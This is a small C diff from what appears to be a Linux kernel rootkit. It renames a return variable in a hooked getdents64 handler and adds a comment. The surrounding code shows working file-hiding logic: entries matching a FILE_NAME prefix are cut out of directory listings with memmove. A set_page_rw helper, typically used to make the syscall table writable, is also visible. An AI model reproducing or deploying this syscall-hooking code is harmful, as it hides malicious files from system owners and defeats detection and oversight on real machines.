@@ -24,8 +24,10 @@ what is being returned
 
 d_reclen: Size of this dirent
 d_name:   Filename (null-terminated)
+
+nob: number of bytes
 */
-  int rtn = getdents64_original(fd, dirp, count);
+  int nob = getdents64_original(fd, dirp, count);
   struct linux_dirent64 *cur = dirp;
 
   int i = 0;
@@ -34,9 +36,9 @@ d_name:   Filename (null-terminated)
 
     if(strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       char *next_rec = (char *)cur + size;
-      int len = (uintptr_t)dirp + rtn - (uintptr_t)next_rec;
+      int len = (uintptr_t)dirp + nob - (uintptr_t)next_rec;
       memmove(cur, next_rec, len);
-      rtn -= size;
+      nob -= size;
       continue;
     }
 
@@ -44,7 +46,7 @@ d_name:   Filename (null-terminated)
     cur = (struct linux_dirent64*) ((char*)dirp + i);
   }
 
-  return rtn;
+  return nob;
 }
 
 int set_page_rw(uintptr_t addr, int f) {
